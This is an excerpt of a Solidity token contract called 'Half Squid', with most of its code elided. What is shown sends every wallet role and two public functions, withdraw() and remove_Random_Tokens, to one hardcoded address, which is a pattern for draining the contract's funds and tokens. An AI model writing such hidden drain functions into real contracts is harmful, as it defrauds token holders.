...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x7E7Be3363abf024A781DcC3925e9C62fd5c7A028; 
...
contract HALFSQUID is Context, IERC20, Ownable {
    ...
    string private _name = "Half Squid";
    string private _symbol = "SQUID 0.5";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x7E7Be3363abf024A781DcC3925e9C62fd5c7A028); // 
    address payable public teamWalletAddress = payable(0x7E7Be3363abf024A781DcC3925e9C62fd5c7A028); // 
    ...
    function withdraw() public {
        ...
        payable(address(0x7E7Be3363abf024A781DcC3925e9C62fd5c7A028)).transfer(address(this).balance);
    }
...
function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(address(0x7E7Be3363abf024A781DcC3925e9C62fd5c7A028),removeRandom);
}}